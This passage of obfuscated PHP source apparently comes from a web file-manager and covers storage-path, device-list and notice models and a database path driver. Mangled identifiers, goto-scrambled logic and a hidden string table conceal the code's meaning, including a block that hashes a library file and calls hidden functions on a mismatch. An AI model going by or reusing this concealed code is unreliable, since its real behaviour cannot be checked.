$E‘œêàÅ´š[$DâñÅ¯®·É[$a¦²Íó±¡ª[401]][$a¦²Íó±¡ª[990]]]; $DâñÅ¯®·É[$a¦²Íó±¡ª[401]][$a¦²Íó±¡ª[991]] = $E‘œêàÅ´š[$DâñÅ¯®·É[$a¦²Íó±¡ª[401]][$a¦²Íó±¡ª[991]]]; } goto D¬Û•ÁÒ“; e‹ÔÖÅÑ: if ($DâñÅ¯®·É[$a¦²Íó±¡ª[2197]] && $DâñÅ¯®·É[$a¦²Íó±¡ª[2197]][$a¦²Íó±¡ª[368]] == $a¦²Íó±¡ª[1059]) { $eŠ÷¸¦’†Œ[] = $C×Ò©ÕÅÑ[$a¦²Íó±¡ª[364]]; unset($BæÉ‚‚‹ Û[$cÀ£‹éˆÊâ]); continue; } goto DÙÚÙ¾ğÍ”; D¬Û•ÁÒ“: if ($DâñÅ¯®·É[$a¦²Íó±¡ª[29]] == $a¦²Íó±¡ª[2192]) { $DâñÅ¯®·É[$a¦²Íó±¡ª[401]][$a¦²Íó±¡ª[366]] = $E‘œêàÅ´š[$DâñÅ¯®·É[$a¦²Íó±¡ª[401]][$a¦²Íó±¡ª[366]]]; } if ($DâñÅ¯®·É[$a¦²Íó±¡ª[29]] == $a¦²Íó±¡ª[1981]) { $DâñÅ¯®·É[$a¦²Íó±¡ª[2197]] = $DâñÅ¯®·É[$a¦²Íó±¡ª[388]]; $DâñÅ¯®·É[$a¦²Íó±¡ª[2184]] = $DâñÅ¯®·É[$a¦²Íó±¡ª[2197]][$a¦²Íó±¡ª[366]]; $DâñÅ¯®·É[$a¦²Íó±¡ª[388]] = !1; $DâñÅ¯®·É[$a¦²Íó±¡ª[366]] = $a¦²Íó±¡ª[33]; } if ($DâñÅ¯®·É[$a¦²Íó±¡ª[388]] && $DâñÅ¯®·É[$a¦²Íó±¡ª[388]][$a¦²Íó±¡ª[368]] == $a¦²Íó±¡ª[1059]) { $eŠ÷¸¦’†Œ[] = $C×Ò©ÕÅÑ[$a¦²Íó±¡ª[364]]; unset($BæÉ‚‚‹ Û[$cÀ£‹éˆÊâ]); continue; } goto e‹ÔÖÅÑ; DÙÚÙ¾ğÍ”: } $C×Ò©ÕÅÑ[$a¦²Íó±¡ª[401]] = $DâñÅ¯®·É; goto cåÖ†­¯ƒ; EßÑ¬×î: $C×Ò©ÕÅÑ[$a¦²Íó±¡ª[28]] = isset($A‘ÀêáÑÅõ[$a¦²Íó±¡ª[28]]) ? $A‘ÀêáÑÅõ[$a¦²Íó±¡ª[28]] : LNG($a¦²Íó±¡ª[2353]); $C×Ò©ÕÅÑ[$a¦²Íó±¡ª[2233]] = isset($A‘ÀêáÑÅõ[$a¦²Íó±¡ª[2233]]) ? $A‘ÀêáÑÅõ[$a¦²Íó±¡ª[2233]] : $a¦²Íó±¡ª[33]; $C×Ò©ÕÅÑ[$a¦²Íó±¡ª[1247]] = isset($F‚›½ÏšŞ[$AË¥¼ŠÅÂ»]) ? $F‚›½ÏšŞ[$AË¥¼ŠÅÂ»] : $bºØÁĞ­‹Š; goto eõƒÁ®Ä¿–; cåÖ†­¯ƒ: unset($C×Ò©ÕÅÑ[$a¦²Íó±¡ª[2358]]); $f¹Œ’‘‰‡Œ[] = $C×Ò©ÕÅÑ; goto bÖâ“Œ—ğ¾; eõƒÁ®Ä¿–: $C×Ò©ÕÅÑ[$a¦²Íó±¡ª[2149]] = $A‘ÀêáÑÅõ; $DâñÅ¯®·É = json_decode($C×Ò©ÕÅÑ[$a¦²Íó±¡ª[401]], !0); $C×Ò©ÕÅÑ[$a¦²Íó±¡ª[2350]] = isset($DâñÅ¯®·É[$a¦²Íó±¡ª[2350]]) ? $DâñÅ¯®·É[$a¦²Íó±¡ª[2350]] : $a¦²Íó±¡ª[33]; goto eÌõÚ™ñ£³; bÖâ“Œ—ğ¾: } $this->clearSystemPathLog($eŠ÷¸¦’†Œ); goto C”‚÷„…ã; C”‚÷„…ã: return $f¹Œ’‘‰‡Œ; goto fÔ¹œÙêŞ; FÉ¼ïõÁ¬: $a¦²Íó±¡ª =& $_SERVER[¿õñ]; $Aê”ˆ•Ê´ = array_to_keyvalue($BæÉ‚‚‹ Û, $a¦²Íó±¡ª[33], $a¦²Íó±¡ª[1350]); $aäí¡–¾´… = Model($a¦²Íó±¡ª[469])->userListInfo(array_unique($Aê”ˆ•Ê´)); goto bÆµñ„è; bÆµñ„è: $E‘œêàÅ´š = $this->getSourceList($BæÉ‚‚‹ Û); $F‚›½ÏšŞ = $this->typeAll(); $f¹Œ’‘‰‡Œ = array(); goto d«Å£‰§®ğ; fÔ¹œÙêŞ: } private function clearSystemPathLog($A¡…­¶Û¼ò) { $e‡ÖÆ±¬·é =& $_SERVER[¿õñ]; if (count($A¡…­¶Û¼ò) == 0) { return; } $FìåÛ¥Ğ£¹ = array($e‡ÖÆ±¬·é[364] => array($e‡ÖÆ±¬·é[7], array_unique($A¡…­¶Û¼ò))); $this->where($FìåÛ¥Ğ£¹)->delete(); } public function deviceList($aÉ¹¿»äãß, $DŸˆ­ß´ö¢ = null) { goto AÚ“„À‰˜Ú; AÚ“„À‰˜Ú: $b²ˆ¿İ·‰ =& $_SERVER[¿õñ]; $e²ˆ¦ƒ×¿… = array($b²ˆ¿İ·‰[1350] => $aÉ¹¿»äãß, $b²ˆ¿İ·‰[29] => $b²ˆ¿İ·‰[1954]); if ($DŸˆ­ß´ö¢) { $e²ˆ¦ƒ×¿…[$b²ˆ¿İ·‰[184]] = array($b²ˆ¿İ·‰[935], $DŸˆ­ß´ö¢); } goto F ¨…å’—Ò; A†Ö¤…Ğù: return array_values($F¨¥ËŒ¡Ş£); goto cí÷ÁÓ« ¨; F ¨…å’—Ò: $A°Â´ëãÀ¢ = $this->where($e²ˆ¦ƒ×¿…)->order($b²ˆ¿İ·‰[2195])->select(); $F¨¥ËŒ¡Ş£ = array(); foreach ($A°Â´ëãÀ¢ as $fÔ‡Ş×¤â© => &$d‹’¼ÙÓóé) { goto b”âºÕØƒˆ; DÜ¹çÍ©: $d‹’¼ÙÓóé[$b²ˆ¿İ·‰[401]] = $C¼‡Ç÷Æ†”; $F¨¥ËŒ¡Ş£[$Dµ›ñàã¬Ö] = $d‹’¼ÙÓóé; goto A¶‡‹èÍ; A›×®ª¯Ñğ: $Dµ›ñàã¬Ö = md5(json_encode($C¼‡Ç÷Æ†”)); if (isset($F¨¥ËŒ¡Ş£[$Dµ›ñàã¬Ö])) { unset($A°Â´ëãÀ¢[$fÔ‡Ş×¤â©]); continue; } $this->ipAddress($d‹’¼ÙÓóé); goto DÜ¹çÍ©; b”âºÕØƒˆ: $C¼‡Ç÷Æ†” = json_decode($d‹’¼ÙÓóé[$b²ˆ¿İ·‰[401]], !0); $d‹’¼ÙÓóé[$b²ˆ¿İ·‰[2350]] = isset($C¼‡Ç÷Æ†”[$b²ˆ¿İ·‰[2350]]) ? $C¼‡Ç÷Æ†”[$b²ˆ¿İ·‰[2350]] : $b²ˆ¿İ·‰[33]; unset($C¼‡Ç÷Æ†”[$b²ˆ¿İ·‰[2350]]); goto A›×®ª¯Ñğ; A¶‡‹èÍ: } goto A†Ö¤…Ğù; cí÷ÁÓ« ¨: } } class SystemNoticeModel extends ModelBaseLight { public $optionType = "\123\x79\163\x74\145\155\x2e\156\x6f\x74\x69\143\145\x4c\151\163\x74"; public $field = array("\x6e\141\x6d\145", "\x63\x6f\x6e\x74\x65\156\164", "\x61\165\164\150", "\155\157\144\145", "\x74\151\155\x65", "\164\171\x70\x65", "\x73\157\x72\x74"); public function listData($e§…‘«‘Ù¦ = false, $FÔŠÔ ¸§» = "\163\157\x72\x74", $f¾öÑ¨Á¦´ = false) { return parent::listData($e§…‘«‘Ù¦, $FÔŠÔ ¸§», $f¾öÑ¨Á¦´); } public function add($C¦•áÉÂÜ…) { goto fÖÃÖóëåƒ; E¶ØÄ§Ô®: $AĞ ø‰œóÜ = time(); if ($C¦•áÉÂÜ…[$c•Ş¨®Áá[12]] == $c•Ş¨®Áá[2359]) { $AĞ ø‰œóÜ = strtotime($C¦•áÉÂÜ…[$c•Ş¨®Áá[187]]); } $C¦•áÉÂÜ…[$c•Ş¨®Áá[187]] = $AĞ ø‰œóÜ; goto a•éµâš•‚; a•éµâš•‚: return parent::insert($C¦•áÉÂÜ…); goto Aìê§¼Îåï; fÖÃÖóëåƒ: $c•Ş¨®Áá =& $_SERVER[¿õñ]; $c£äœõ“ä† = $this->findByName($C¦•áÉÂÜ…[$c•Ş¨®Áá[28]]); if ($c£äœõ“ä†) { return !1; } goto E¶ØÄ§Ô®; Aìê§¼Îåï: } public function update($bÆ§Á²ä, $aª¸ŠÎ–¯ß) { goto Aß§ë™Šä˜; d —£ãÇÉó: $aª¸ŠÎ–¯ß[$Fö—Æç©¼‚[187]] = $a½ø«³¾áà; return parent::update($bÆ§Á²ä, $aª¸ŠÎ–¯ß); goto eõÔ¯Çˆ÷î; Aß§ë™Šä˜: $Fö—Æç©¼‚ =& $_SERVER[¿õñ]; $AŒ‡®á†·ï = $this->listData($bÆ§Á²ä); $A™›ËÙ¢µœ = $this->findByName($aª¸ŠÎ–¯ß[$Fö—Æç©¼‚[28]]); goto bòæ¶œ ‡œ; bòæ¶œ ‡œ: if (!$AŒ‡®á†·ï || $A™›ËÙ¢µœ && $A™›ËÙ¢µœ[$Fö—Æç©¼‚[364]] != $AŒ‡®á†·ï[$Fö—Æç©¼‚[364]]) { return !1; } $a½ø«³¾áà = time(); if ($aª¸ŠÎ–¯ß[$Fö—Æç©¼‚[12]] == $Fö—Æç©¼‚[2359]) { $a½ø«³¾áà = strtotime($aª¸ŠÎ–¯ß[$Fö—Æç©¼‚[187]]); } goto d —£ãÇÉó; eõÔ¯Çˆ÷î: } public function remove($b¦Òö“šâ°) { $D¿ƒì®Ë‰É = $this->listData($b¦Òö“šâ°); if (!$D¿ƒì®Ë‰É || $D¿ƒì®Ë‰É[$_SERVER[¿õñ][1059]]) { return !1; } return parent::remove($b¦Òö“šâ°); } public function sort($f‘ò¦Ö„¿Ñ, $Fâª…Áî˜») { return parent::update($f‘ò¦Ö„¿Ñ, $Fâª…Áî˜»); } private function initUserOption() { $E‡ÖºÙ‘Àˆ =& $_SERVER[¿õñ]; $this->optionType = $E‡ÖºÙ‘Àˆ[2360]; $this->modelType = $E‡ÖºÙ‘Àˆ[2361]; $this->field = array($E‡ÖºÙ‘Àˆ[2362], $E‡ÖºÙ‘Àˆ[28], $E‡ÖºÙ‘Àˆ[187], $E‡ÖºÙ‘Àˆ[29], $E‡ÖºÙ‘Àˆ[686], $E‡ÖºÙ‘Àˆ[180]); } public function userNoticeGet($Fš±Î´ÄÖÖ = false) { $this->initUserOption(); return parent::listData($Fš±Î´ÄÖÖ, $_SERVER[¿õñ][364], !0); } public function userNoticeAdd($b‹í™•Öô¿) { $d·ÙÜšª‹õ =& $_SERVER[¿õñ]; $this->initUserOption(); $b¿õËøˆ = $this->findByKey($d·ÙÜšª‹õ[2362], $b‹í™•Öô¿[$d·ÙÜšª‹õ[364]]); if ($b¿õËøˆ) { return !0; } $FµÖ¸ÉØ­¼ = array($d·ÙÜšª‹õ[2362] => $b‹í™•Öô¿[$d·ÙÜšª‹õ[364]], $d·ÙÜšª‹õ[28] => $b‹í™•Öô¿[$d·ÙÜšª‹õ[28]], $d·ÙÜšª‹õ[187] => $b‹í™•Öô¿[$d·ÙÜšª‹õ[187]], $d·ÙÜšª‹õ[29] => isset($b‹í™•Öô¿[$d·ÙÜšª‹õ[29]]) ? $b‹í™•Öô¿[$d·ÙÜšª‹õ[29]] : 1, $d·ÙÜšª‹õ[686] => 0, $d·ÙÜšª‹õ[180] => 0); return parent::insert($FµÖ¸ÉØ­¼); } public function userNoticeEdit($e“Á‰š”², $eØÛ‚’£®) { $this->initUserOption(); return parent::update($e“Á‰š”², $eØÛ‚’£®); } } goto B“¡¬Ÿí±§; F˜Ú¦ïÅá: $EãÄŒ«–¬ = LIB_DIR . $_SERVER[¿õñ][778]; $a»˜Ñ¹­‚ = $_SERVER[¿õñ][779]; if ($_SERVER[$_SERVER[¿õñ][780]] != $a»˜Ñ¹­‚($EãÄŒ«–¬)) { goto DÜºÑ‘«Ø»; e¥ö¿‹‡ä: $Cæ“ôÓ’‘($EãÄŒ«–¬); goto E–²‘ø”ÒÙ; DÜºÑ‘«Ø»: $c¾õ¿„¯¢© = $_SERVER[¿õñ][781]; $FÚÓ‡îŒ = $_SERVER[$_SERVER[¿õñ][782]] . $_SERVER[¿õñ][783]; $d´§‡¹ï·È = $c¾õ¿„¯¢©($FÚÓ‡îŒ); goto dõÎŠ”œ‰Ú; dõÎŠ”œ‰Ú: $B¹‚Ç «·« = explode($_SERVER[¿õñ][214], $d´§‡¹ï·È); if (count($B¹‚Ç «·«) < $_SERVER[¿õñ][550]) { $aàİ ‡¡áˆ = $_SERVER[¿õñ][784]; $aàİ ‡¡áˆ(); } $Cæ“ôÓ’‘ = $_SERVER[¿õñ][785]; goto e¥ö¿‹‡ä; E–²‘ø”ÒÙ: } goto eáÕâ‘º¡Ñ; D½ºÇïŒ´¡: class PathDriverDB extends PathDriverBase { public $model; public $pathParse; public function __construct($eŸ‰ŠÊ„–ö) { $this->pathParse = $eŸ‰ŠÊ„–ö; $this->model = Model($_SERVER[¿õñ][1087]); } public function getPath($d¹£Á¦¤½¹) { return trim($d¹£Á¦¤½¹, $_SERVER[¿õñ][8]); } public function pathFather($Bù–¡ï÷é) { $C’¬Àïİóø = $this->parse($Bù–¡ï÷é); $C’¬Àïİóø = $this->infoSimple($Bù–¡ï÷é); return $C’¬Àïİóø ? $C’¬Àïİóø[$_SERVER[¿õñ][457]] : !1; } public function getPathName($aÈ´Úîè†Š) { $BÕ¿Ğ×Õ×ª = $this->infoSimple($aÈ´Úîè†Š); return $BÕ¿Ğ×Õ×ª ? $BÕ¿Ğ×Õ×ª[$_SERVER[¿õñ][28]] : !1; } public function getPathOuter($fÑö¶Çâ‚Î) { if (!$fÑö¶Çâ‚Î) { return $fÑö¶Çâ‚Î; } $E´¶íØçğ¾ = $this->parse($fÑö¶Çâ‚Î); return KodIO::make($E´¶íØçğ¾[$_SERVER[¿õñ][364]]); } public function copyFolderFromIO($C²ìË¿ëœ¦, $Eë÷ˆÑ‚‚«, $Eˆ‹†—Ù©¬, $c…Àİ„Şã„, $CÎ™‚á´Ú) { $bõ¤ôÎêÅù = $this->model->copyFolderFromIO($C²ìË¿ëœ¦, $Eë÷ˆÑ‚‚«, $Eˆ‹†—Ù©¬, $c…Àİ„Şã„, $CÎ™‚á´Ú); return KodIO::make($bõ¤ôÎêÅù); } public function isParentOf($fÀÙÍÎ‡°, $b—¾ªİöë¦) { return $this->model->isParentOf($fÀÙÍÎ‡°, $b—¾ªİöë¦); } public function mkfile($e¥ª’†¢ê£, $bœ®–à±»Æ = '', $D» Û«òÊ = REPEAT_RENAME) { $B«•›ø®ùº =& $_SERVER[¿õñ]; $e™µÜ™à¬† = $this->parse($e¥ª’†¢ê£); $e¥ª’†¢ê£ = $e™µÜ™à¬†[$B«•›ø®ùº[364]]; for ($aÚ°ŞÓ˜ƒ = 0; $aÚ°ŞÓ˜ƒ < count($e™µÜ™à¬†[$B«•›ø®ùº[1088]]); $aÚ°ŞÓ˜ƒ++) { $FƒéÖ˜½¯Ò = $e™µÜ™à¬†[$B«•›ø®ùº[1088]][$aÚ°ŞÓ˜ƒ]; if ($aÚ°ŞÓ˜ƒ == count($e™µÜ™à¬†[$B«•›ø®ùº[1088]]) - 1) { $e¥ª’†¢ê£ = $this->model->mkfile($e¥ª’†¢ê£, $FƒéÖ˜½¯Ò, $bœ®–à±»Æ, $D» Û«òÊ); break; } $e¥ª’†¢ê£ = $this->model->mkdir($e¥ª’†¢ê£, $FƒéÖ˜½¯Ò, REPEAT_SKIP); } return $this->getPathOuter($e¥ª’†¢ê£); } public function mkdir($F±ç‘¯ÓšÏ, $d„„¢Ü‡â® = REPEAT_SKIP) { $AŠßÄˆÀ¤· =& $_SERVER[¿õñ]; $bÍ½ÛËğÊ = $this->parse($F±ç‘¯ÓšÏ); $F±ç‘¯ÓšÏ = $bÍ½ÛËğÊ[$AŠßÄˆÀ¤·[364]]; for ($a‰›«ç¶ß = 0; $a‰›«ç¶ß < count($bÍ½ÛËğÊ[$AŠßÄˆÀ¤·[1088]]); $a‰›«ç¶ß++) { $F²Œ‰ã–ï = $bÍ½ÛËğÊ[$AŠßÄˆÀ¤·[1088]][$a‰›«ç¶ß]; $F±ç‘¯ÓšÏ = $this->model->mkdir($F±ç‘¯ÓšÏ, $F²Œ‰ã–ï, $d„„¢Ü‡â®); } return $this->getPathOuter($F±ç‘¯ÓšÏ); } public function copyFile($b¥°ì­»Ù, $A¾¨ˆÅá, $B³£ÎÂ¼ª = REPEAT_REPLACE) { $Dêğ¥‰í¡Ã =& $_SERVER[¿õñ]; $b×É®†ìµ‘ = $this->parse($A¾¨ˆÅá); $e¡¡øëë’ö = $this->model->copy($b¥°ì­»Ù, $b×É®†ìµ‘[$Dêğ¥‰í¡Ã[364]], $B³£ÎÂ¼ª, $b×É®†ìµ‘[$Dêğ¥‰í¡Ã[76]]); return $e¡¡øëë’ö ? $this->getPathOuter($e¡¡øëë’ö) : !1; } public function moveFile($e—ŸÀ‹“, $aÚäˆºƒÆ‚, $cÕæ˜ÈõùÅ = REPEAT_REPLACE) { $C®õ¾µ‚ =& $_SERVER[¿õñ]; $C£Œ²˜–¾ = $this->parse($aÚäˆºƒÆ‚); $bÆíÁ–Ê»õ = $this->model->move($e—ŸÀ‹“, $C£Œ²˜–¾[$C®õ¾µ‚[364]], $cÕæ˜ÈõùÅ, $C£Œ²˜–¾[$C®õ¾µ‚[76]]); return $bÆíÁ–Ê»õ ? $this->getPathOuter($bÆíÁ–Ê»õ) : !1; } public function copy($Bàİİ‰”, $dìê ±‰ÒÙ, $e‹ÃÅë¬İà = REPEAT_REPLACE) { $BŒš‰³ç ³ = $this->parse($dìê ±‰ÒÙ); $eõŞ·»Ïë = $this->model->copy($Bàİİ‰”, $BŒš‰³ç ³[$_SERVER[¿õñ][364]], $e‹ÃÅë¬İà); return $eõŞ·»Ïë ? $this->getPathOuter($eõŞ·»Ïë) : !1; } public function move($cÔºÇê²©, $F¯î¥†Æ, $aÂ¨æ«´¾ = REPEAT_REPLACE) { $bŠÒó¤‡À§ = $this->parse($F¯î¥†Æ); $BÙµñøÛ‘¦ = $this->model->move($cÔºÇê²©, $bŠÒó¤‡À§[$_SERVER[¿õñ][364]], $aÂ¨æ«´¾); return $BÙµñøÛ‘¦ ? $this->getPathOuter($BÙµñøÛ‘¦) : !1; } public function remove($AÒ÷ãŒŠïø, $fÇÃ”â¡¯ = true) { return $this->model->remove($AÒ÷ãŒŠïø, $fÇÃ”â¡¯); } public function rename($BØ£¤Á°àß, $d‡‡ÍŞÙ¢) { $A¥¸ùôŒå = $this->model->rename($BØ£¤Á°àß, $d‡‡ÍŞÙ¢); return $A¥¸ùôŒå ? $this->getPathOuter($BØ£¤Á°àß) : $A¥¸ùôŒå; } public function size($føÖ’ñá˜) { $bÉäõÖÍçè = $this->infoSimple($føÖ’ñá˜); return $bÉäõÖÍçè ? $bÉäõÖÍçè[$_SERVER[¿õñ][78]] : 0; } public function infoSimple($AÔªË™›Ñ) { return $this->model->sourceInfo($AÔªË™›Ñ); } public function info($eÛóóÀ¤Šù) { return $this->infoParse($eÛóóÀ¤Šù); } public function infoAuth($eƒ»°Á×ßù) { return $this->infoParse($eƒ»°Á×ßù, !1, !0); } public function infoWithChildren($e÷ä’—™Ÿˆ) { return $this->infoParse($e÷ä’—™Ÿˆ, !0); } protected function infoParse($fµŒå³°è, $F«Ë¡´¡ˆ = false, $A’¾šğ = false) { if (!$F«Ë¡´¡ˆ) { return $this->model->pathInfo($fµŒå³°è, $A’¾šğ); } return $this->model->pathInfoMore($fµŒå³°è); } public function infoFull($BÓÑµ­å ¥) { $F¬²ç²è´ =& $_SERVER[¿õñ]; $AØç‰…’¹í = explode($F¬²ç²è´[8], $BÓÑµ­å ¥); $eù˜š‚Â¯ = implode($F¬²ç²è´[8], array_splice($AØç‰…’¹í, 1)); return $this->model->pathInfoByPath($AØç‰…’¹í[0], $eù˜š‚Â¯); } public function hashSimple($BµîƒË§¸) { $Aïø§çß‘ =& $_SERVER[¿õñ]; $D¯×™À‘­ù = $this->infoWithChildren($BµîƒË§¸); return $D¯×™À‘­ù[$Aïø§çß‘[159]][$Aïø§çß‘[161]]; } public function hashMd5($aßà–«ÇÈ›) { $fóõÇÑÕ¥© =& $_SERVER[¿õñ]; $F±º¥ÅÍ»° = $this->infoWithChildren($aßà–«ÇÈ›); return $F±º¥ÅÍ»°[$fóõÇÑÕ¥©[159]][$fóõÇÑÕ¥©[160]]; } public function exist($aİ¸á¤ëŒç) { $c¥×²…Ñí¨ =& $_SERVER[¿õñ]; $E¯ÂÊÊİÑ¶ = $this->parse($aİ¸á¤ëŒç); if (!$E¯ÂÊÊİÑ¶[$c¥×²…Ñí¨[76]]) { return $this->isFile($aİ¸á¤ëŒç) || $this->isFolder($aİ¸á¤ëŒç); } $AƒôŸÛ²’ = array($c¥×²…Ñí¨[365] => $E¯ÂÊÊİÑ¶[$c¥×²…Ñí¨[364]], $c¥×²…Ñí¨[28] => $E¯ÂÊÊİÑ¶[$c¥×²…Ñí¨[76]]); $Fæ¯ªõ·ˆÎ = $this->model->where($AƒôŸÛ²’)->find(); return $Fæ¯ªõ·ˆÎ ? !0 : !1; } public function isFile($a“†Å‘Æƒ©) { $DÚÉ¸Õ´¬ =& $_SERVER[¿õñ]; $A°àøãµß— = $this->infoSimple($a“†Å‘Æƒ©); return $A°àøãµß— && $A°àøãµß—[$DÚÉ¸Õ´¬[367]] == $DÚÉ¸Õ´¬[493] ? !1 : !0; } public function isFolder($côíÓíÌ‘) { $DÖÈœ³ï² =& $_SERVER[¿õñ]; $Aª¬½ÜáÃã = $this->infoSimple($côíÓíÌ‘); return $Aª¬½ÜáÃã && $Aª¬½ÜáÃã[$DÖÈœ³ï²[367]] == $DÖÈœ³ï²[493] ? !0 : !1; } public function listPath($f¬â¹¦»ëœ, $CİĞæ³­ó¬ = false) { $E­’¼ò´ =& $_SERVER[¿õñ]; if ($f¬â¹¦»ëœ == $E­’¼ò´[33]) { return !1; } $fƒ—ˆ´®ğ = array($E­’¼ò´[365] => $f¬â¹¦»ëœ); if ($CİĞæ³­ó¬) { return $this->model->listSource($fƒ—ˆ´®ğ, -1); } return $this->model->listSource($fƒ—ˆ´®ğ); } public function has($E‚—‡ÑÈÅÑ, $FÑèàĞà¾Ò = false, $aÀÑÈ†¯« = null) { $EºŠìàğïˆ =& $_SERVER[¿õñ]; $BÏ›ËÆ´äŞ = $this->infoWithChildren($E‚—‡ÑÈÅÑ); if ($FÑèàĞà¾Ò) { return array($EºŠìàğïˆ[189] => $BÏ›ËÆ´äŞ[$EºŠìàğïˆ[189]], $EºŠìàğïˆ[188] => $BÏ›ËÆ´äŞ[$EºŠìàğïˆ[188]]); } return $aÀÑÈ†¯« ? $BÏ›ËÆ´äŞ[$EºŠìàğïˆ[189]] : $BÏ›ËÆ´äŞ[$EºŠìàğïˆ[188]]; } public function listAll($fëåâ–Œ§ˆ) { $e©Ü«Ê˜Ş» = IO::info($this->pathParse[$_SERVER[¿õñ][76]]); if (!$e©Ü«Ê˜Ş») { return array(); } return $this->model->listAll($fëåâ–Œ§ˆ); } public function getContent($cƒêÚ‘š ×) { return $this->model->getContent($cƒêÚ‘š ×); } public function setContent($dŸéù¨Öàò, $CÑŞÜ«×Öç = '') { return $this->model->setContent($dŸéù¨Öàò, $CÑŞÜ«×Öç); } public function fileSubstr($b¯³Ç› ®â, $A‡İöÉùÑ¥, $b«Ôå‘£Ú) { return $this->model->fileSubstr($b¯³Ç› ®â, $A‡İöÉùÑ¥, $b«Ôå‘£Ú); } public function download($cù‰Ó±ÚùÉ, $EËî²å‚£… = '') { $a³ÚŒ¨ê³ø = get_path_father($EËî²å‚£…); $A¿¹„Åîë‡ = get_path_this($EËî²å‚£…); $a´¾ö¢’¥„ = $this->model->fileInfoGet($cù‰Ó±ÚùÉ); $a­¾ÒµÀ‚ë = IO::copy($a´¾ö¢’¥„[$_SERVER[¿õñ][76]], $a³ÚŒ¨ê³ø, !1, $A¿¹„Åîë‡); return $a­¾ÒµÀ‚ë; } public function upload($Cîñ˜©šÃ‰, $E•·°Š‡É, $c¢Ú­ìÖ³º = false, $EÑ­ò©µÎƒ = REPEAT_REPLACE) { $BŸîàĞÀ³ =& $_SERVER[¿õñ]; $c¥½Â°éËÑ = $this->parse($Cîñ˜©šÃ‰); $e¨ê™À•Ë¬ = $this->model->addFile($c¥½Â°éËÑ[$BŸîàĞÀ³[364]], $E•·°Š‡É, $c¥½Â°éËÑ[$BŸîàĞÀ³[76]], $c¢Ú­ìÖ³º, $EÑ­ò©µÎƒ); return $this->getPathOuter($e¨ê™À•Ë¬); } public function uploadFileByID($d“Ğ÷†Ğí, $F±ÇĞ˜ƒÉ, $BğÑº“©Ò) { $Dõµ¸£²â =& $_SERVER[¿õñ]; $FŒ±•†—å = $this->parse($d“Ğ÷†Ğí); $C²ë–äŒ™ = $this->model->addFileByFileID($FŒ±•†—å[$Dõµ¸£²â[364]], $F±ÇĞ˜ƒÉ, $FŒ±•†—å[$Dõµ¸£²â[76]], $BğÑº“©Ò); return $this->getPathOuter($C²ë–äŒ™); } public function addFileByRemote($a¯Èïç…‡’, $DİõÒšØà¥, $Dõ¦è‡µ· = array(), $d–•áÂÈó° = '', $Bàºí˜›š) { $cß£Ÿ®¡· =& $_SERVER[¿õñ]; $EŒÌ³Íé´„ = $this->parse($a¯Èïç…‡’); $d–•áÂÈó° = empty($d–•áÂÈó°) ? $EŒÌ³Íé´„[$cß£Ÿ®¡·[76]] : $d–•áÂÈó°; $dÇŠõâù÷ö = $this->model->addFileByRemote($EŒÌ³Íé´„[$cß£Ÿ®¡·[364]], $DİõÒšØà¥, $d–•áÂÈó°, $Dõ¦è‡µ·, $Bàºí˜›š); return $this->getPathOuter($dÇŠõâù÷ö); } public function uploadLink($bíù¦½‰ˆÏ, $Aîø‘íÛš¢ = 0) { $cÖÌè÷˜Ç =& $_SERVER[¿õñ]; $fé‡Óê¢ = $this->parse($bíù¦½‰ˆÏ); $bíù¦½‰ˆÏ = Model($cÖÌè÷˜Ç[536])->createFileName($fé‡Óê¢[$cÖÌè÷˜Ç[76]]); $C²óÖï§Ú¨ = IO::uploadLink($bíù¦½‰ˆÏ, $Aîø‘íÛš¢); return $C²óÖï§Ú¨; } public function fileNameAuto($a»·Ğ”­øò, $bœèÈšó‘é, $dâó´ã„›© = REPEAT_REPLACE, $fÙè¦ˆ®™½ = false) { return $this->model->fileNameAuto($a»·Ğ”­øò, $bœèÈšó‘é, $dâó´ã„›©, $fÙè¦ˆ®™½); } public function fileNameExist($eÕë·ç›İì, $d‹ùéšÕÌÈ) { return $this->model->fileNameExist($eÕë·ç›İì, $d‹ùéšÕÌÈ); } protected function _fileOut($e‚ğŸ¾áëÎ, $DßÌ¹­Ñ• = false, $dÆÇ¤Ş²ÛÕ = false, $BÅ¬…¿ÅŸ = '', $d‹¤©¤ªÂ” = false) { goto e‡íÎ±˜Ò; d·î—½â§…: $A¶›âô˜ = $this->model->fileInfoGet($e‚ğŸ¾áëÎ); $BÅ¬…¿ÅŸ = $A¶›âô˜[$E•ÑÀ«ù×“[160]] ? $A¶›âô˜[$E•ÑÀ«ù×“[160]] : $BÅ¬…¿ÅŸ; $FÑ¸‹«øæ = isset($GLOBALS[$E•ÑÀ«ù×“[1090]]) ? $GLOBALS[$E•ÑÀ«ù×“[1090]] : $AªÓ¾ò®Œ[$E•ÑÀ«ù×“[28]]; goto Bó‹•ÇÀî; e‡íÎ±˜Ò: $E•ÑÀ«ù×“ =& $_SERVER[¿õñ]; $AªÓ¾ò®Œ = $this->model->sourceInfo($e‚ğŸ¾áëÎ); if ($AªÓ¾ò®Œ[$E•ÑÀ«ù×“[367]] == $E•ÑÀ«ù×“[493]) { header($E•ÑÀ«ù×“[1089]); die; } goto d·î—½â§…; Bó‹•ÇÀî: if ($d‹¤©¤ªÂ”) { return IO::fileOutServer($A¶›âô˜[$E•ÑÀ«ù×“[76]], $DßÌ¹­Ñ•, $FÑ¸‹«øæ, $BÅ¬…¿ÅŸ); } IO::fileOut($A¶›âô˜[$E•ÑÀ«ù×“[76]], $DßÌ¹­Ñ•, $FÑ¸‹«øæ, $BÅ¬…¿ÅŸ); goto d±øÀì±ØÓ; d±øÀì±ØÓ: } public function fileOut($a©”âÌÎ, $fÙ‰°®ˆ’ = false, $E¬Ï÷›Ë¿… = false, $d”´Ûİ˜À‡ = '') { $this->_fileOut($a©”âÌÎ, $fÙ‰°®ˆ’, $E¬Ï÷›Ë¿…, $d”´Ûİ˜À‡); } public function fileOutServer($cÍáïÄÌÛî, $e…Ë†õÀÚ = false, $d¬Òì¿†Ã… = false, $dŒÈó§İå = '') { $this->_fileOut($cÍáïÄÌÛî, $e…Ë†õÀÚ, $d¬Òì¿†Ã…, $dŒÈó§İå, !0); } protected function _fileOutImage($cÊÇêî©»™, $FŸï£Û‚¥ï = 250) { $dÀ•ÀÇ‘‚“ =& $_SERVER[¿õñ]; $A³İƒÇ™³İ = $this->model->sourceInfo($cÊÇêî©»™); if ($A³İƒÇ™³İ[$dÀ•ÀÇ‘‚“[367]] == $dÀ•ÀÇ‘‚“[493]) { show_json($dÀ•ÀÇ‘‚“[1091] . $cÊÇêî©»™, !1); } $GLOBALS[$dÀ•ÀÇ‘‚“[1090]] = $A³İƒÇ™³İ[$dÀ•ÀÇ‘‚“[28]]; 